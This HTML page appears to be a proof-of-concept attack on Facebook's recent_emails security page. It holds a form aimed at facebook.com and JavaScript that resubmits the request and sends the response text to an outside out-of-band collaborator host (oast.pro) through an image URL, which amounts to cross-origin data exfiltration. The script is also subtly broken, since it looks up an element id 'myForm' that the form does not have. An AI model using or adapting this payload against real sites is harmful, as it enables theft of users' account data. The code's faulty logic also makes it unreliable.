<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture Redirected Response</title>
</head>
<body>
    <form method="GET" action="https://www.facebook.com:443/recent_emails/security/?hide_back_button=1&from_accounts_center=1" >
		<input type="text" name="hide_back_button" value="1">
		<input type="text" name="from_accounts_center" value="1">
		<input type="submit" value="Send">
	</form>
    <script>
        // Function to capture redirected response
        function captureRedirectedResponse(response) {
            // Send the redirected response to the Burp Suite collaborator
            var img = new Image();
            img.src = "http://co4oiq53nckmdhpt89g0rjnkujqxocigt.oast.pro?redirectedResponse=" + encodeURIComponent(response);
        }

        // Function to intercept form submission and capture redirected response
        function interceptFormSubmission(event) {
            event.preventDefault(); // Prevent the form from being submitted
            var formData = new FormData(document.getElementById('myForm')); // Extract form data
            // Perform form submission
            setTimeout(function() {
                var xhr = new XMLHttpRequest();
                xhr.open('POST', document.getElementById('myForm').getAttribute('action'));
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        // Capture redirected response
                        captureRedirectedResponse(xhr.responseText);
                    }
                };
                xhr.send(formData);
            }, 1000); // Adjust the delay as needed
        }

        // Call the function to intercept form submission when the page loads
        window.onload = function() {
            document.getElementById('myForm').addEventListener('submit', interceptFormSubmission);
        };
    </script>
</body>
</html>
